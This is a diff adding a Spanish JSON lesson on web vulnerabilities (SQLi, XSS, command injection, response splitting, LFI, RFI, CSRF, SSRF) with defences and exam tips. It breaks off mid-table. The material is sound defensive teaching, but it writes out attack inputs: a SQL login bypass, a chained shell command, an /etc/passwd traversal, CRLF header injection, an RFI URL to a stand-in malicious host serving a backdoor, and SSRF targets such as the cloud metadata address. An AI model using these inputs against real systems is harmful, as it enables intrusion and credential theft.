@@ -1,0 +1,712 @@
+{
+  "course": "sistemas",
+  "number": 3,
+  "title": "Vulnerabilidades en aplicaciones web",
+  "minutes": 45,
+  "intro": {
+    "why": "Casi todo lo que hacemos a diario pasa por aplicaciones web: el banco, el correo, la tienda online, la sede electrónica de Hacienda. Cada formulario o cada parámetro de una dirección es una puerta por la que un atacante puede intentar colar algo. En 2021, un fallo en la librería Log4j (CVE-2021-44228) permitió a atacantes de todo el mundo ejecutar órdenes en miles de servidores con solo enviar un texto bien construido. Este tema repasa las vulnerabilidades web más frecuentes y peligrosas, cómo se explotan y cómo se previenen.",
+    "before": [
+      "Una **aplicación web** es un programa que vive en un **servidor** y que usamos a través del **navegador** (Chrome, Firefox…). El navegador es el **cliente**: pide cosas; el servidor responde.",
+      "Navegador y servidor se hablan con **HTTP** (HyperText Transfer Protocol, protocolo de transferencia de hipertexto): el navegador envía una **petición** y el servidor devuelve una **respuesta** con unas **cabeceras** (datos de control) y un **cuerpo** (la página).",
+      "Una **base de datos** guarda la información de la aplicación (usuarios, pedidos…) y se consulta con un lenguaje llamado **SQL** (Structured Query Language, lenguaje de consulta estructurado).",
+      "Una **cookie de sesión** es un pequeño dato que el servidor entrega al navegador tras iniciar sesión; el navegador la reenvía en cada petición para demostrar «soy el que ya se identificó».",
+      "Una **vulnerabilidad** es un fallo que un atacante puede aprovechar; **explotarla** es aprovecharla de verdad para hacer daño."
+    ],
+    "goals": [
+      "Al terminar sabrás explicar qué son OWASP Top Ten, CWE, CWE Top 25 y CVE, y en qué se diferencian.",
+      "Sabrás reconocer en un enunciado de test cada vulnerabilidad del tema: inyección SQL, XSS, inyección de comandos, HTTP response splitting, LFI, RFI, CSRF, SSRF, fallos de autenticación y de autorización.",
+      "Sabrás decir, para cada una, quién es la víctima, dónde se ejecuta el ataque y cuál es la defensa más eficaz.",
+      "Sabrás distinguir los tipos de inyección SQL (errores, unión, ciega) y de XSS (reflejado, persistente, DOM).",
+      "Sabrás leer un identificador CVE y explicar para qué sirve."
+    ]
+  },
+  "sections": [
+    {
+      "id": "catalogos",
+      "title": "Los catálogos de fallos: OWASP, CWE y CVE",
+      "pages": [4, 6],
+      "blocks": [
+        { "type": "analogy", "text": "Imagina el mundo de la medicina. Hay **enfermedades** (la gripe, la diabetes), hay **pacientes concretos** con un número de historia clínica y hay **listas de las enfermedades más frecuentes** que publican las autoridades sanitarias. En seguridad web pasa lo mismo: CWE es el catálogo de «enfermedades» (tipos de fallo), CVE es el número de cada «caso» concreto encontrado en un programa real, y OWASP Top Ten o CWE Top 25 son las listas de las más frecuentes y peligrosas." },
+        { "type": "term", "term": "OWASP (Open Worldwide Application Security Project)", "text": "Comunidad abierta y sin ánimo de lucro dedicada a la seguridad de las aplicaciones. Su proyecto más famoso, **OWASP Top Ten**, es una lista de las diez categorías de riesgo más importantes en aplicaciones web. Según OWASP, las más frecuentes en los últimos años son la **inyección de código**, los fallos de **autenticación y gestión de sesiones** y el **XSS**." },
+        { "type": "term", "term": "CWE (Common Weakness Enumeration)", "text": "Catálogo de **tipos de debilidad** del software que mantiene la organización MITRE. Cada tipo lleva un número: CWE-89 es la inyección SQL, CWE-79 el XSS, CWE-78 la inyección de comandos… No habla de un programa concreto, sino de la clase de error." },
+        { "type": "term", "term": "CWE Top 25", "text": "Lista de las **25 debilidades de software más peligrosas**, calculada a partir de miles de vulnerabilidades reales (el temario cita 31 770 registros CVE del año analizado). Sirve para saber dónde invertir esfuerzo." },
+        { "type": "term", "term": "CVE (Common Vulnerabilities and Exposures)", "text": "El **identificador único** de una vulnerabilidad concreta en un producto concreto, por ejemplo CVE-2021-44228 (Log4j). Se explica a fondo en el último apartado." },
+        { "type": "list", "title": "Para qué sirve la lista CWE Top 25", "items": [
+          "**Reducir vulnerabilidades**: conocer las causas de fondo ayuda a eliminar clases enteras de defectos durante el SDLC (Software Development Life Cycle, ciclo de vida del desarrollo del software).",
+          "**Ahorrar costes**: cada fallo evitado al programar es un problema menos que parchear después.",
+          "**Analizar tendencias**: ver qué crece y qué baja permite enfocar el esfuerzo de seguridad.",
+          "**Priorizar por explotabilidad**: algunas debilidades, como la inyección de comandos, atraen especialmente a los atacantes."
+        ] },
+        { "type": "table", "title": "Las vulnerabilidades del tema y su número CWE", "head": ["Vulnerabilidad", "CWE"], "rows": [
+          ["Inyección SQL (SQLi)", "CWE-89"],
+          ["Cross-site scripting (XSS)", "CWE-79"],
+          ["Inyección de comandos del sistema operativo", "CWE-78"],
+          ["HTTP response splitting", "CWE-113"],
+          ["Local file inclusion (LFI) / path traversal", "CWE-22"],
+          ["Remote file inclusion (RFI)", "CWE-73 / CWE-98"],
+          ["Cross-site request forgery (CSRF)", "CWE-352"],
+          ["Server-side request forgery (SSRF)", "CWE-918"],
+          ["Fallos de autenticación", "CWE-287"],
+          ["Fallos de autorización", "CWE-863"]
+        ] },
+        { "type": "exam", "text": "No confundas CWE con CVE: **CWE = tipo de fallo** (la «enfermedad»), **CVE = caso concreto** en un producto (el «paciente»). Tampoco hace falta memorizar todos los números CWE, pero sí conviene reconocer los más típicos (89 SQLi, 79 XSS, 78 comandos)." },
+        { "type": "key", "text": "OWASP Top Ten y CWE Top 25 son listas de los fallos más frecuentes y peligrosos; CWE cataloga tipos de debilidad y CVE da nombre a cada vulnerabilidad concreta." }
+      ]
+    },
+    {
+      "id": "raiz-comun",
+      "title": "La raíz común: confiar en lo que escribe el usuario",
+      "pages": [6, 29],
+      "blocks": [
+        { "type": "analogy", "text": "Piensa en un camarero que apunta en la comanda exactamente lo que le dice el cliente y la pasa a cocina sin leerla. Si un cliente dice «una ensalada; y además dale al de la mesa 5 la caja registradora», el cocinero lo ejecuta todo. La mayoría de vulnerabilidades web nacen igual: la aplicación coge lo que escribe el usuario y lo mete, sin revisar, en algo que **otro programa interpreta como órdenes**." },
+        { "type": "p", "text": "Una **entrada del usuario** es cualquier dato que llega desde fuera: lo que se escribe en un formulario, un parámetro de la dirección (lo que va tras el ?), una cookie o una cabecera HTTP. **Validar** la entrada es comprobar que tiene el formato esperado; **sanear** (o sanitizar) es limpiarla o neutralizar los caracteres peligrosos." },
+        { "type": "p", "text": "Según **dónde** acabe la entrada sin validar, el ataque cambia de nombre:" },
+        { "type": "table", "title": "Mismo error, distinto intérprete", "head": ["La entrada acaba en…", "Ataque", "Quién ejecuta lo inyectado"], "rows": [
+          ["Una consulta a la base de datos", "Inyección SQL", "El motor de base de datos"],
+          ["Una página que verán otros", "XSS", "El navegador de la víctima"],
+          ["Un comando del sistema operativo", "Inyección de comandos", "El sistema operativo del servidor"],
+          ["Una cabecera de la respuesta HTTP", "HTTP response splitting", "El navegador o la caché, que ven dos respuestas"],
+          ["Una ruta de archivo", "LFI / path traversal o RFI", "El servidor, que lee o incluye el archivo"],
+          ["Una dirección que el servidor visita", "SSRF", "El propio servidor, que hace la petición"]
+        ] },
+        { "type": "p", "text": "Hay otros fallos que **no** nacen de la validación de entradas sino de la lógica: el **CSRF** abusa de que el navegador envía las cookies automáticamente, y los fallos de **autenticación** y **autorización** nacen de no comprobar bien quién eres o qué puedes hacer." },
+        { "type": "list", "title": "Defensas que se repiten en todo el tema", "items": [
+          "**Lista blanca** (whitelisting, lista permitida): aceptar solo lo que sabemos que es bueno, en lugar de intentar adivinar todo lo malo.",
+          "**Separar datos de código**: que la entrada del usuario nunca pueda convertirse en instrucción (consultas parametrizadas, funciones de librería en lugar de comandos).",
+          "**Codificar la salida**: convertir los caracteres especiales para que se muestren como texto, no se interpreten.",
+          "**Mínimo privilegio**: que la aplicación y sus cuentas tengan solo los permisos imprescindibles, para que, si algo falla, el daño sea pequeño.",
+          "**Parches y actualizaciones**: corregir los fallos ya conocidos."
+        ] },
+        { "type": "exam", "text": "Si te preguntan de qué es causa común la **falta de validación de entradas**, la respuesta son las **inyecciones de código y el XSS**. Desconfía de las opciones con «solo» (por ejemplo, «solo inyección de comandos»): la falta de validación provoca muchos tipos de ataque. El CSRF, en cambio, no se debe a la validación de entradas." },
+        { "type": "key", "text": "Casi todas las vulnerabilidades del tema son la misma historia: datos del usuario que, sin validar, acaban interpretados como órdenes por otro programa. Lo que cambia es qué programa los interpreta." }
+      ]
+    },
+    {
+      "id": "sqli",
+      "title": "Inyección SQL (CWE-89): cuando el dato se convierte en orden",
+      "pages": [6, 8],
+      "blocks": [
+        { "type": "term", "term": "Inyección SQL (SQLI o SQLi, SQL injection)", "text": "Ataque en el que el usuario introduce trozos de SQL en un campo de entrada y la aplicación, al construir su consulta pegando ese texto, acaba ejecutándolos. Permite **robar, modificar o borrar datos** e incluso **tomar el control del servidor de base de datos**." },
+        { "type": "p", "text": "La causa de fondo es que la aplicación **trata la entrada del usuario como parte de la consulta** en lugar de tratarla como un simple dato. Suele ocurrir al **concatenar** (pegar) el texto del usuario dentro de la consulta." },
+        { "type": "example", "title": "El clásico «admin' OR '1'='1»", "text": "Un formulario de acceso construye la consulta SELECT * FROM users WHERE username = '[usuario]' AND password = '[contraseña]'. El atacante escribe como usuario admin' OR '1'='1 y deja la contraseña en blanco. La comilla cierra el texto antes de tiempo y la consulta queda: ... WHERE username = 'admin' OR '1'='1' AND password = ''. Como '1'='1' siempre es verdadero, la condición se cumple y el atacante **entra como administrador sin saber la contraseña**." },
+        { "type": "table", "title": "Tipos de inyección SQL", "head": ["Tipo", "Cómo obtiene la información el atacante"], "rows": [
+          ["Basada en errores (error-based)", "Provoca errores en la base de datos; los mensajes de error revelan la estructura o los datos."],
+          ["Basada en unión (union-based)", "Usa el operador UNION para pegar a la consulta original otra suya y leer datos de otras tablas."],
+          ["Ciega (blind)", "No recibe datos directamente: los deduce observando el comportamiento (si la página da error o no, cuánto tarda en responder)."]
+        ] },
+        { "type": "term", "term": "Consulta parametrizada (prepared statement)", "text": "Consulta que se escribe primero como **plantilla** con huecos (por ejemplo, WHERE username = ?) y después se rellena con los datos. El motor recibe por separado la **estructura** y los **valores**, así que lo que escriba el usuario siempre se trata como dato y nunca puede cambiar la forma de la consulta." },
+        { "type": "analogy", "text": "Es como un impreso oficial con casillas: aunque escribas «y además anula mi multa» en la casilla del nombre, el funcionario lo leerá como un nombre raro, no como una orden. La plantilla ya está fijada antes de que tú escribas nada." },
+        { "type": "list", "title": "Prevención (de más a menos eficaz)", "items": [
+          "**Consultas parametrizadas**: el método **más efectivo**, porque ataca la causa (separa estructura y datos).",
+          "**Validación y saneamiento de la entrada**: comprobar formato y eliminar caracteres especiales o código. Ayuda, pero por sí solo puede saltarse.",
+          "**Mínimo privilegio** en las cuentas de la base de datos: si alguien inyecta, que no pueda hacer mucho.",
+          "**Actualizaciones y parches** del servidor web y la base de datos."
+        ] },
+        { "type": "exam", "text": "Trampas típicas: «cifrar la base de datos» **no** evita la inyección (la consulta maliciosa se ejecuta igual); «filtrar el punto y coma» o «validar solo en el navegador» son parches incompletos; «cambiar a POST» u «ocultar los mensajes de error» no tocan la causa. Si preguntan qué **ataca la causa** o qué es **más efectivo**, la respuesta es **consultas parametrizadas**. Y si te preguntan qué causa la inyección: **tratar la entrada del usuario como instrucciones de la consulta**." },
+        { "type": "key", "text": "La inyección SQL ocurre cuando el dato del usuario se mezcla con la consulta. La cura es separarlos: consultas parametrizadas." }
+      ]
+    },
+    {
+      "id": "xss",
+      "title": "Cross-site scripting (XSS, CWE-79): el ataque se ejecuta en tu navegador",
+      "pages": [8, 11],
+      "blocks": [
+        { "type": "analogy", "text": "Imagina un tablón de anuncios de un portal. Alguien cuelga una nota que dice «quien lea esto, deje su llave en el buzón 3B». Si los vecinos obedecieran todo lo que leen en el tablón, el problema no sería del tablón, sino de los lectores. En el XSS el «tablón» es la página web y los «vecinos obedientes» son los navegadores de los usuarios, que ejecutan cualquier script que encuentren en ella." },
+        { "type": "term", "term": "XSS (Cross-Site Scripting, secuencias de comandos entre sitios)", "text": "Vulnerabilidad que permite a un atacante **inyectar un script malicioso (normalmente JavaScript) en una página web que verán otros usuarios**. El objetivo **no es el servidor, sino los usuarios**: el código se ejecuta **en el navegador de la víctima** como si fuera parte legítima del sitio." },
+        { "type": "term", "term": "Script y JavaScript", "text": "Un script es un pequeño programa. JavaScript es el lenguaje de programación que entienden los navegadores; con él una página puede leer cookies, cambiar lo que se ve o enviar datos a otro sitio." },
+        { "type": "list", "title": "Qué puede conseguir el atacante", "items": [
+          "**Robar cookies de sesión** y con ellas **secuestrar la sesión** de la víctima.",
+          "**Redirigir** a la víctima a un sitio malicioso.",
+          "Realizar otras acciones no autorizadas en su nombre."
+        ] },
+        { "type": "example", "title": "El comentario envenenado", "text": "Un blog no valida su campo de comentarios. El atacante, en vez de opinar, escribe una etiqueta script que contiene alert(\"¡Ataque XSS!\"). Cada vez que otro lector abre esa entrada, su navegador ejecuta el script y muestra la ventana emergente. Una ventana emergente es inofensiva; en un ataque real el script enviaría la cookie de sesión al atacante." },
+        { "type": "table", "title": "Los tres tipos de XSS", "head": ["Tipo", "Dónde está el script", "A quién afecta"], "rows": [
+          ["Reflejado (reflected)", "Viaja en un enlace o formulario; el servidor lo «refleja» en la respuesta sin guardarlo.", "A quien haga clic en el enlace trampa: hay que engañar a cada víctima, una a una."],
+          ["Persistente o almacenado (stored)", "Se guarda de forma permanente en la base de datos (un comentario, un perfil).", "A **todos** los que visiten la página después, sin hacer nada especial. Es el **más peligroso**."],
+          ["Basado en DOM (DOM-based)", "Se ejecuta por una manipulación del DOM en el propio navegador; el servidor nunca procesa el script.", "Al usuario cuyo navegador manipula la página; ocurre **totalmente en el cliente**."]
+        ] },
+        { "type": "term", "term": "DOM (Document Object Model)", "text": "La representación en memoria que el navegador hace de la página: un árbol con todos sus elementos, que JavaScript puede leer y modificar." },
+        { "type": "list", "title": "Prevención", "items": [
+          "**Validar y sanear la entrada**: nunca confiar en lo que escribe el usuario; validar, filtrar o codificar antes de mostrar.",
+          "**Codificar la salida**: convertir los caracteres especiales (el signo menor que, el mayor que y el ampersand) en sus equivalentes seguros (las entidades HTML &lt;, &gt; y &amp;), para que el navegador los muestre como texto y no los interprete como código.",
+          "**CSP (Content Security Policy, política de seguridad de contenido)**: una **cabecera de seguridad** con la que el administrador indica **qué recursos (scripts, hojas de estilo…) puede cargar la página**. Si un script no está permitido, el navegador no lo ejecuta."
+        ] },
+        { "type": "exam", "text": "Pistas de enunciado: «código que **ejecutan otros usuarios en su navegador**» = XSS. «Un comentario que afecta a **todos los lectores posteriores**» = XSS **almacenado**. Diferencia almacenado/reflejado: el **reflejado** llega a la víctima concreta que pulsa el enlace (no se conserva en la aplicación); el **almacenado** queda guardado y puede afectar a **todos** los que visitan la página. Trampa: el reflejado **no** usa la base de datos; el que la usa es el almacenado. CSP **restringe los recursos y scripts que una página puede cargar**; no tiene nada que ver con parametrizar consultas ni con autenticar." },
+        { "type": "key", "text": "En el XSS la víctima es el usuario: el script se ejecuta en su navegador. El persistente es el peor porque alcanza a todos los visitantes. Defensas: validar entrada, codificar salida y CSP." }
+      ]
+    },
+    {
+      "id": "comandos",
+      "title": "Inyección de comandos (CWE-78): órdenes directas al sistema operativo",
+      "pages": [11, 14],
+      "blocks": [
+        { "type": "term", "term": "Inyección de comandos (command injection, OS command injection)", "text": "Vulnerabilidad que permite a un atacante **ejecutar comandos arbitrarios en el sistema operativo del servidor** a través de una aplicación web. Ocurre cuando la aplicación construye un comando del sistema usando la entrada del usuario." },
+        { "type": "term", "term": "Comando del sistema operativo", "text": "Una orden de texto que entiende el sistema (Linux, Windows): ping comprueba si una máquina responde, ls lista los archivos de una carpeta. En Linux, el punto y coma permite encadenar varias órdenes en una sola línea." },
+        { "type": "example", "title": "La utilidad de ping", "text": "Una web ofrece «comprobar si un servidor está activo» y construye el comando ping + [lo que escribas]. Un usuario normal escribe 8.8.8.8. El atacante escribe 8.8.8.8; ls. El servidor ejecuta **dos** órdenes: el ping y ls, que lista los archivos. A partir de ahí puede explorar todo el disco del servidor." },
+        { "type": "table", "title": "Tipos", "head": ["Tipo", "Cómo ve el resultado el atacante"], "rows": [
+          ["Directa", "El resultado del comando aparece en la respuesta de la aplicación; recopilar información es fácil."],
+          ["Ciega (blind command injection)", "No ve el resultado: deduce si funcionó por retrasos de tiempo o por la creación de archivos."]
+        ] },
+        { "type": "list", "title": "Impacto", "items": [
+          "**Robar datos**: leer archivos y bases de datos sensibles.",
+          "**Tomar el control del servidor**: instalar malware o crear usuarios con privilegios.",
+          "**Comprometer la red**: usar el servidor como trampolín para atacar otras máquinas internas.",
+          "**Borrar o modificar archivos**: interrupciones o daños irreparables."
+        ] },
+        { "type": "list", "title": "Prevención: que la entrada nunca forme parte de un comando", "items": [
+          "**Evitar ejecutar comandos externos**: usar las funciones de la librería del lenguaje de programación (por ejemplo, una función de red en lugar de llamar a ping).",
+          "**Validar y sanear**: eliminar o escapar los caracteres especiales que sirven para encadenar órdenes.",
+          "**Lista blanca**: validar lo que sí se quiere, por ejemplo, aceptar solo direcciones IP con formato correcto.",
+          "**Mínimo privilegio**: ejecutar la aplicación con los menos permisos posibles. No evita la inyección, pero **reduce el impacto** si ocurre."
+        ] },
+        { "type": "exam", "text": "«Ejecutar comandos arbitrarios en el sistema operativo del servidor» u «órdenes no previstas desde entradas manipuladas» = inyección de comandos (no SSRF ni control de acceso roto). Si preguntan qué principio **reduce el impacto**, es el **mínimo privilegio**: las opciones de «máximos permisos», «cuenta compartida por todos los servicios» o «confiar en que el formulario es interno» son lo contrario." },
+        { "type": "key", "text": "La inyección de comandos convierte la entrada del usuario en órdenes del sistema operativo. Evita llamar a comandos, valida con lista blanca y ejecuta con mínimos privilegios." }
+      ]
+    },
+    {
+      "id": "response-splitting",
+      "title": "HTTP response splitting (CWE-113): partir una respuesta en dos",
+      "pages": [14, 16],
+      "blocks": [
+        { "type": "p", "text": "Una respuesta HTTP tiene una forma fija: varias **cabeceras**, cada una en su línea (Nombre: valor), después **una línea en blanco** y por último el **cuerpo** (la página). Lo que separa una línea de otra son dos caracteres invisibles: el **retorno de carro** (CR, escrito \\r) y el **salto de línea** (LF, escrito \\n)." },
+        { "type": "analogy", "text": "Imagina una carta con un formulario de remitente donde tú rellenas tu nombre. Si pudieras escribir en esa casilla un «salto de página» seguido de una carta nueva, el cartero creería que hay dos cartas, y la segunda la habrías redactado tú por completo." },
+        { "type": "term", "term": "HTTP response splitting (división de respuesta HTTP)", "text": "Vulnerabilidad que permite al atacante **insertar caracteres \\r\\n en las cabeceras** de la respuesta. Así termina la cabecera actual, añade otras nuevas o incluso una segunda respuesta completa, y el navegador cree que recibe **dos respuestas separadas**." },
+        { "type": "p", "text": "Surge cuando la aplicación usa datos del usuario sin validar para construir una cabecera de respuesta, por ejemplo una cookie o una redirección. El atacante inyecta algo como: un texto, \\r\\n, Content-Length: 0, una línea en blanco y luego HTTP/1.1 200 OK con un Set-Cookie suyo. La **primera respuesta** parece vacía (longitud 0); la **segunda** la controla totalmente el atacante." },
+        { "type": "list", "title": "Impacto: suele ser la puerta a otros ataques", "items": [
+          "**Secuestro de sesión**: inyecta una cookie de sesión que él controla.",
+          "**XSS**: mete **HTML o JavaScript** en el cuerpo de la segunda respuesta.",
+          "**Envenenamiento de caché web**: un proxy o una CDN (Content Delivery Network, red de entrega de contenidos) guarda la respuesta falsa y la sirve a otros usuarios.",
+          "**Redirecciones maliciosas**: envía a la víctima a una web de phishing."
+        ] },
+        { "type": "list", "title": "Prevención", "items": [
+          "**Validación estricta**: eliminar o codificar \\r y \\n antes de meter nada en una cabecera. Es la medida más efectiva.",
+          "**Codificación segura**: usar funciones de codificación específicas de HTTP que escapan solas los caracteres especiales.",
+          "**No poner la entrada del usuario en las cabeceras**; si no queda más remedio, usar valores de una lista blanca."
+        ] },
+        { "type": "exam", "text": "Los caracteres culpables son **retorno de carro y salto de línea** (CR LF) en las **cabeceras**; no confundir con ../ (path traversal), con comillas (SQL) ni con etiquetas script (XSS). Si preguntan qué puede suponer, la respuesta es **inyección de código JavaScript y HTML** («la B y la D»); la **inyección SQL no** tiene nada que ver. Si se usan datos del usuario en una cabecera, hay que controlar los **caracteres que puedan alterar la estructura de las cabeceras**." },
+        { "type": "key", "text": "Con \\r\\n en una cabecera, el atacante parte la respuesta en dos y escribe la segunda a su gusto: cookies, HTML o JavaScript. Hay que neutralizar CR y LF." }
+      ]
+    },
+    {
+      "id": "lfi",
+      "title": "Local file inclusion y path traversal (CWE-22): subir escaleras hasta donde no debes",
+      "pages": [16, 18],
+      "blocks": [
+        { "type": "term", "term": "Ruta de archivo y ../", "text": "Una ruta indica dónde está un archivo: documentos/reporte.pdf. La secuencia ../ significa «sube a la carpeta de arriba». Encadenando varias (../../../) se puede llegar a la raíz del disco." },
+        { "type": "term", "term": "LFI (Local File Inclusion) o path traversal (recorrido de directorios)", "text": "Vulnerabilidad que permite al atacante **leer, y a veces ejecutar, archivos que ya están en el propio servidor**. Ocurre cuando la aplicación usa la entrada del usuario para decidir qué archivo abrir sin validarla." },
+        { "type": "analogy", "text": "Es como un archivero al que pides «la carpeta 12 del armario de clientes» y, si le pides «sal del armario, baja al sótano y tráeme la caja fuerte», lo hace sin preguntar." },
+        { "type": "example", "title": "De un PDF al archivo de cuentas", "text": "La web muestra informes con mostrar.php?archivo=documentos/reporte.pdf. El atacante cambia el parámetro a ../../../../etc/passwd. Si la aplicación no filtra ../, el servidor sube de carpeta varias veces y devuelve /etc/passwd, el archivo de cuentas de usuario de Linux, al que nunca debería tener acceso." },
+        { "type": "list", "title": "Riesgos", "items": [
+          "**Divulgación de información sensible**: archivos de configuración, código fuente, datos del sistema.",
+          "**Denegación de servicio (DoS, Denial of Service)**: incluir archivos enormes o de sistema que tumben el servidor.",
+          "En el peor caso, **toma de control completa del servidor**."
+        ] },
+        { "type": "list", "title": "Prevención", "items": [
+          "**Lista blanca** (lista permitida): aceptar solo nombres de archivo predefinidos y seguros.",
+          "**No usar la entrada directamente en la ruta**: usar un **índice o mapa** (por ejemplo, ?informe=3 corresponde internamente a un archivo concreto).",
+          "**Sanear la entrada**: eliminar o escapar ., /, ./ y ../.",
+          "**Mínimo privilegio** para el usuario con el que corre la aplicación."
+        ] },
+        { "type": "exam", "text": "«Acceder a recursos **locales** del servidor» = **path traversal** (LFI), no RFI (que trae archivos **remotos**). Defensas falsas habituales: comprobar solo que la ruta termine en una extensión permitida, confiar en que viene de un formulario interno o cambiar el nombre del parámetro. La buena es una **lista permitida de archivos o identificadores válidos**." },
+        { "type": "key", "text": "LFI/path traversal usa ../ para salir de la carpeta permitida y leer archivos locales. Se previene con listas blancas o identificadores, nunca dejando que el usuario escriba la ruta." }
+      ]
+    },
+    {
+      "id": "rfi",
+      "title": "Remote file inclusion (CWE-73/98): el servidor ejecuta un archivo del atacante",
+      "pages": [19, 20],
+      "blocks": [
+        { "type": "term", "term": "RFI (Remote File Inclusion, inclusión de archivos remotos)", "text": "Vulnerabilidad que permite al atacante hacer que la aplicación **incluya y ejecute un archivo alojado en un servidor externo** bajo su control. Es típica de aplicaciones PHP (un lenguaje muy usado para webs) que incluyen archivos según un parámetro." },
+        { "type": "example", "title": "La puerta trasera descargada", "text": "La web carga contenido con pagina.php?archivo=... El atacante escribe pagina.php?archivo=http://servidor-malicioso.com/backdoor.txt. Si no hay protección, el servidor víctima descarga backdoor.txt y lo **ejecuta como si fuera su propio código**, dando al atacante el control. El temario añade un requisito: el nombre del archivo remoto no debe coincidir con ningún archivo local." },
+        { "type": "table", "title": "RFI frente a LFI", "head": ["Aspecto", "LFI", "RFI"], "rows": [
+          ["Origen del archivo", "Ya está en el servidor de la víctima", "Está en un servidor externo del atacante"],
+          ["Quién controla el contenido", "Nadie lo escribe: el atacante lee lo que hay", "El atacante, que escribe el archivo a su gusto"],
+          ["Riesgo típico", "Leer información sensible, DoS", "Ejecución remota de código (RCE)"]
+        ] },
+        { "type": "term", "term": "RCE (Remote Code Execution, ejecución remota de código)", "text": "Que un atacante consiga ejecutar sus propios programas en una máquina ajena a distancia. Es el **riesgo más grave de la RFI**: puede llevar a la toma total del servidor, robo de datos, instalación de malware o alteración de la web." },
+        { "type": "list", "title": "Prevención", "items": [
+          "**Deshabilitar allow_url_include** en php.ini (el archivo de configuración de PHP): así PHP no puede incluir archivos desde direcciones remotas.",
+          "**Validar las entradas**: lista blanca de archivos permitidos o identificadores seguros no manipulables.",
+          "**Mínimo privilegio** para el servidor web y la aplicación."
+        ] },
+        { "type": "exam", "text": "El riesgo que **destaca** la RFI es **ejecutar código alojado bajo control externo**. «Leer una ruta local sin recurso externo» describe LFI; «falsificar la petición del navegador autenticado» es CSRF; «escuchar datos en tránsito» es otro tipo de ataque (de red)." },
+        { "type": "key", "text": "RFI = incluir un archivo remoto que escribe el atacante; su riesgo estrella es la ejecución remota de código. En PHP, desactiva allow_url_include." }
+      ]
+    },
+    {
+      "id": "csrf",
+      "title": "Cross-site request forgery (CSRF, CWE-352): tu navegador firma por ti",
+      "pages": [20, 23],
+      "blocks": [
+        { "type": "analogy", "text": "Imagina que tu banco te conoce de vista y te atiende sin pedirte el DNI porque llevas puesta una pulsera de cliente. Alguien te entrega un sobre cerrado y te pide que lo dejes en la ventanilla. Dentro hay una orden de transferencia. El cajero ve tu pulsera y la ejecuta. Nadie te ha robado la pulsera: han usado que la llevas puesta." },
+        { "type": "term", "term": "CSRF (Cross-Site Request Forgery, falsificación de petición entre sitios)", "text": "Vulnerabilidad que **obliga al navegador de un usuario ya autenticado a enviar una petición no deseada** a una aplicación vulnerable. Explota la **confianza que la aplicación tiene en el navegador del usuario**." },
+        { "type": "steps", "title": "Cómo ocurre", "items": [
+          "Tienes la sesión iniciada en tu banco en una pestaña.",
+          "En otra pestaña visitas una web del atacante o pulsas un enlace trampa.",
+          "Esa web envía automáticamente una petición al banco: «transferir 1000 euros a la cuenta X».",
+          "Tu navegador **añade solo las cookies de sesión** del banco, como hace siempre.",
+          "El banco ve una petición con tu sesión válida y la procesa como si la hubieras enviado tú."
+        ] },
+        { "type": "p", "text": "Fíjate en lo importante: **el atacante no roba tus credenciales ni tus cookies**. Aprovecha que tu navegador ya las tiene y las envía solo. Tampoco inyecta código en la página: solo provoca una petición." },
+        { "type": "term", "term": "Token anti-CSRF", "text": "Valor **único, secreto e impredecible** que la aplicación genera para cada sesión e incrusta en cada formulario como **campo oculto**. Cuando el formulario vuelve, el servidor comprueba que el token coincide con el de la sesión. El atacante no puede adivinarlo, así que su petición falsa llega sin token válido y se rechaza." },
+        { "type": "steps", "title": "El token paso a paso", "items": [
+          "El usuario abre el formulario; el servidor genera un token y lo asocia a su sesión.",
+          "El token viaja al navegador como campo oculto del formulario.",
+          "Al enviar, el token vuelve al servidor junto con los datos.",
+          "El servidor compara: si no coincide con el de esa sesión, rechaza la petición."
+        ] },
+        { "type": "list", "title": "Otras defensas", "items": [
+          "**Atributo SameSite en las cookies**: restringe cuándo el navegador envía cookies en peticiones que vienen de otro sitio (de origen cruzado).",
+          "**Cabecera Content Security Policy**, como medida adicional."
+        ] },
+        { "type": "exam", "text": "CSRF sirve para **forzar al navegador del usuario a hacer una petición no deseada**, aprovechando que **envía las credenciales de una sesión activa**. No es «robar cookies» (eso sería XSS), ni «inyectar código», ni «acceder a la base de datos», ni «el servidor conectándose a destinos internos» (eso es SSRF). Para el banco que quiere comprobar que el formulario procede de la sesión esperada: **token impredecible**. Trampas: un campo oculto con **valor fijo compartido** no sirve (el atacante lo conocería); confiar **solo** en el identificador de sesión es justo lo que el ataque aprovecha; usar **solo POST** no basta." },
+        { "type": "key", "text": "En el CSRF el atacante no roba nada: hace que tu propio navegador, con tu sesión abierta, envíe una petición que no querías. La defensa principal es el token anti-CSRF impredecible." }
+      ]
+    },
+    {
+      "id": "ssrf",
+      "title": "Server-side request forgery (SSRF, CWE-918): el servidor como recadero",
+      "pages": [23, 25],
+      "blocks": [
+        { "type": "analogy", "text": "Piensa en el recepcionista de una empresa, que puede entrar a cualquier despacho. Tú, desde la calle, no. Si le pides «tráeme lo que haya en el despacho del director» y lo hace sin preguntar, has usado su acceso para llegar a donde tú no puedes. En el SSRF el recepcionista es el servidor." },
+        { "type": "term", "term": "SSRF (Server-Side Request Forgery, falsificación de peticiones del lado del servidor)", "text": "Vulnerabilidad que permite al atacante **obligar al servidor a hacer peticiones HTTP a un destino que elige el atacante**. No ataca al usuario ni al navegador: ataca **directamente al servidor**, aprovechando una función que se conecta a otras direcciones." },
+        { "type": "p", "text": "Aparece cuando la aplicación tiene una función que, por diseño, visita una dirección (por ejemplo, **descargar una imagen desde una URL** para mostrarla) pero **no valida el destino**. Una **URL** (Uniform Resource Locator) es una dirección web, como http://ejemplo.com/foto.jpg." },
+        { "type": "table", "title": "Tres usos de la función «descargar imagen»", "head": ["El atacante pone como URL…", "Y consigue…"], "rows": [
+          ["http://192.168.1.1/admin", "Entrar en un panel de la **red interna**, invisible desde Internet."],
+          ["file:///etc/passwd", "**Leer archivos locales** del servidor."],
+          ["http://169.254.169.254/latest/meta-data/", "Leer los **metadatos de la nube** (datos internos de la máquina virtual, que pueden incluir credenciales)."]
+        ] },
+        { "type": "list", "title": "Riesgos", "items": [
+          "Exposición de información sensible (archivos locales, metadatos de la nube).",
+          "**Escaneo de la red interna**: descubrir qué servicios y puertos hay.",
+          "**Acceso a servicios internos** no expuestos al público (paneles, bases de datos).",
+          "Ejecución remota de código si se combina con otros fallos."
+        ] },
+        { "type": "list", "title": "Prevención", "items": [
+          "**Validar con lista blanca** los **dominios y protocolos** permitidos.",
+          "**Limitar los permisos** del servidor.",
+          "**No devolver las respuestas en crudo**: procesar y sanear lo que el servidor obtiene antes de mostrarlo."
+        ] },
+        { "type": "table", "title": "CSRF frente a SSRF", "head": ["Aspecto", "CSRF", "SSRF"], "rows": [
